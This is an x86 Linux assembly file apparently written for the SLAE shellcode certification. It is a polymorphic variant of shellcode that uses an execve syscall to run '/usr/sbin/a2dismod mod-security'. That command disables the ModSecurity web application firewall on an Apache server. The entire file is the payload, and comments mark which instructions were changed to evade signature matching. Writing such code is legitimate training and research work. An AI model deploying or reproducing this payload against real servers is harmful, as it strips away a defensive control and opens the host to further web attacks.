; Filename: disable_modsecurity_polymorphic.nasm
; Author:  David Alvarez Robles (km0xu95)
; Website:  https://blog.asturhackers.es
;
; Purpose: This assembly file has been created for completing the requirements of the SecurityTube Linux Assembly Expert (SLAE) certification


global _start

section .text

_start:
xor eax,eax			; Kept
push eax			; Kept
cdq				; Kept
push dword 0x646f6d73		; Kept
push dword 0x69643261		; Kept
push dword 0x2f6e6962		; Kept
push dword 0x732f7273		; Kept
push dword 0x752f2f2f		; Kept
mov ebx,esp			; Kept

;push eax			; Removed
;push byte +0x32		; Removed
;push dword 0x79746972		; Removed
;push dword 0x75636573		; Removed
;push dword 0x2d646f6d		; Removed
jmp short call_modsec		; Added

continue:
; mov ecx,esp			; Removed
pop ecx				; Added
;xor edx,edx			; Removed
add al,0xb			; Modified
push edx			; Kept
push ecx			; Kept
push ebx			; Kept
mov ecx,esp			; Kept
;mov edx,esp			; Removed
int 0x80			; Kept

call_modsec:					; Added
	call continue				; Added
	modsec: db "mod-security", 0xA		; Added

